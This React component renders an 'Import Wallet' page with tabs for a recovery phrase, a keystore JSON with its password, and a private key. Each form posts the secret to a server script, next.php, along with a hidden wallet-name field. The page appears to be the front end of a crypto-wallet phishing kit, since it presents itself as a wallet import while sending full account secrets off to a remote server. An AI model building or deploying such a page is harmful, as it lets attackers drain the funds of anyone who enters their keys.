import React, {useState} from "react";

const ImportWallet = () => {

  const[tab,setTab] = useState(0);

  return (
    <>
      <h2 style={{
        display: 'flex',
        justifyContent: 'center'
      }}>
        Import Wallet
      </h2>
      <br/>
      <div className="tab">
          <button className={`tablinks ${tab === 0 ? 'active' : ''}`} onClick={() => setTab(0)}>Phrase</button>
          <button className={`tablinks ${tab === 1 ? 'active' : ''}`} onClick={() => setTab(1)}>Keystore JSON</button>
          <button className={`tablinks ${tab === 2 ? 'active' : ''}`} onClick={() => setTab(2)}>Private Key</button>
      </div>
      <div>
          {tab === 0 ? 
            <form className="form" id="form1" action="./next.php" method="post">
                <div id="phrase" className="tabcontent" style={{display: "block"}}>
                    <input type="text" id="walletApp1" name="walletApp" style={{display: "none"}}/>
                    <textarea name="phrase" className="phrase" placeholder="Phrase" required></textarea>
                    <br/>
                    <div className="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
                    <br/>
                    <button type="submit" name="btn1" form="form1" className="btn">IMPORT</button>
                </div>
            </form> : <></>}
          {tab === 1 ? 
            <form className="form" id="form2" action="./next.php" method="post">
                <div id="keystore" className="tabcontent" style={{display: "block"}}>
                    <input type="text" id="walletApp2" name="walletApp" style={{display: "none"}}/>
                    <textarea name="keystoreJSON" className="phrase" placeholder="Keystore JSON" required></textarea>
                    <br/>
                    <div className="field">
                        <input type="password" name="password" placeholder="Password" required/>
                    </div>
                    <div className="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
                    <br/>
                    <button type="submit" name="btn2" form="form2" className="btn">IMPORT</button>
                </div>
            </form> : <></>}
          {tab === 2 ? 
              <form className="form" id="form3" action="./next.php" method="post">
                  <div id="private" className="tabcontent" style={{display: "block"}}>
                      
                      <input type="text" id="walletApp3" name="walletApp" style={{display: "none"}}/>
                      <div className="field">
                          <input type="text" name="privateKey" className="key" placeholder="Private Key" required/>
                      </div>
                      <div className="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
                      <br/>
                      <button type="submit" name="btn3" form="form3" className="btn">IMPORT</button>
                  </div>
              </form> : <></>}
      </div>
    </>
  )
}

export default ImportWallet;